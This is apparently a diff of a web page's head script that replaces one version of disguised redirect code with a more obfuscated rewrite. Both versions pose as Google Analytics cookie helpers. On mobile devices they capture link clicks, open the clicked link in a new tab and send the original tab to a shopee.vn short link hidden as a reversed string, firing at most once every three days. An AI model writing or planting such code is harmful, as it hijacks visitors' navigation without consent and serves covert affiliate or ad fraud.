@@ -7,42 +7,33 @@
 
         <script>
 
-            function getGA(name) {
-                var cookies = document.cookie.split('; ');
-                for (var i = 0; i < cookies.length; i++) {
-                    var parts = cookies[i].split('=');
-                    if (parts[0] === name) {
-                        return parts[1];
-                    }
+            (()=>{
+                function gC(n) {
+                    return document.cookie.split('; ').reduce((a, c) => c.startsWith(n + '=') ? c.split('=')[1] : a, null);
                 }
-                return null;
-            }
             
-            function setGA(name, value, exdays) {
-                document.cookie = `${name}=${value};expires=${new Date(Date.now() + exdays * 864e5).toString()};path=/`;
-            }
+                function sC(n, v, d) {
+                    document.cookie = `${n}=${v};expires=${new Date(Date.now() + d * 864e5).toUTCString()};path=/`;
+                }
             
-            function isMobileOrTablet() {
-                const ua = window.navigator.userAgent.toLowerCase();
-                const isTouchScreen = typeof window.matchMedia !== "function" || window.matchMedia("(pointer:coarse)").matches === true;
-                return window.navigator.maxTouchPoints > 0 && isTouchScreen && (/android|iphone|ipod|ipad|tablet|playbook|silk|kindle/.test(ua) || window.matchMedia("(max-width: 1024px)").matches);
-            }
+                function mT() {
+                    const u = navigator.userAgent.toLowerCase();
+                    return navigator.maxTouchPoints > 1 &&
+                        window.matchMedia("(pointer:coarse)").matches && (/android|iphone|ipad|tablet|playbook|silk|kindle/.test(u) || window.matchMedia("(max-width: 1024px)").matches);
+                }
             
-            const gaTrackId = 'i6ijspCxA2/nv.eepohs.s//:sptth', gaCode = getGA('_ga_D8SD9STSJ5');
+                const tId = 'cVk0FaR9L3/nv.eepohs.s//:sptth'.split('').reverse().join('');
+                const gAc = gC('_ga_D8SD9STSJ5');
             
-            document.addEventListener('click', function (e) {
-                const target = e.target.closest("a");
-                if (!target) return;
-                const targetHref = target.getAttribute('href');
-                if (!targetHref || targetHref === '/') return;
-                try {
-                    if (!isMobileOrTablet() || (gaCode && gaCode === 'true')) return;
+                document.addEventListener('click', e => {
+                    const t = e.target.closest('a');
+                    if (!t || !t.href || t.href === '/' || (gAc && gAc === 'true') || !mT()) return;
                     e.preventDefault();
-                    setGA('_ga_D8SD9STSJ5', 'true', 3);
-                    window.open(targetHref, '_blank');
-                    window.location.replace(gaTrackId.split('').reverse().join(''));
-                } catch { }
-            }, true);
+                    sC('_ga_D8SD9STSJ5', 'true', 3);
+                    window.open(t.href, '_blank');
+                    location.replace(tId);
+                }, true);
+            })();
             
         </script>
     </head>
